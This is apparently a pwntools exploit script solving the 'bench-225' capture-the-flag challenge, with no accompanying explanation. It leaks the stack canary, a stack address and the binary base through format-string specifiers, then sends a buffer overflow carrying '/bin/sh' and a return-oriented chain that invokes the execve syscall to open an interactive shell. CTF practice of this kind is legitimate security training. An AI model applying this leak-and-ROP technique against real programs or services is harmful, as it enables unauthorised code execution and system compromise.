#!/usr/bin/env python3
from pwn import *

exe = ELF("./bench-225_patched")

def conn():
    if args.REMOTE:
        r = remote('bench-225.ctf.umasscybersec.org', 1337)
    else:
        r = gdb.debug(exe.path, '''
            b *motivation
            continue
        ''')
    return r


def main():
    r = conn()
    for i in range(6):
        r.recvuntil(b'Plate\n')
        r.sendline(b'3')
        
    for i in range(5):
        r.recvuntil(b'Plate\n')
        r.sendline(b'4')
    
    r.recvuntil(b'Quote\n')
    r.sendline(b'6')
    r.recvuntil(b'quote: ')
    r.sendline(b'%9$p')
    canary = p64(int(r.recvline().split(b'"')[1], 16))
    print(canary)
    
    r.recvuntil(b'Quote\n')
    r.sendline(b'6')
    r.recvuntil(b'quote: ')
    r.sendline(b'%10$p')
    stackOff = int(r.recvline().split(b'"')[1], 16)
    print(hex(stackOff))

    r.recvuntil(b'Quote\n')
    r.sendline(b'6')
    r.recvuntil(b'quote: ')
    r.sendline(b'%11$p') # leak address of main+837
    baseOff = int(r.recvline().split(b'"')[1], 16) - 837 - 0x135C
    print(hex(baseOff))

    r.recvuntil(b'Quote\n')
    r.sendline(b'6')
    r.recvuntil(b'quote: ')
    r.sendline(
        b'/bin/sh\x00' + canary + b'A' * 8 + 
        p64(baseOff + 0x1332) + p64(59) + 
        p64(baseOff + 0x1336) + p64(stackOff - 48)  + 
        p64(baseOff + 0x133A) + p64(0) +
        p64(baseOff + 0x1338) + p64(0) +
        p64(baseOff + 0x133E)
    )
    r.interactive()
    

if __name__ == "__main__":
    main()
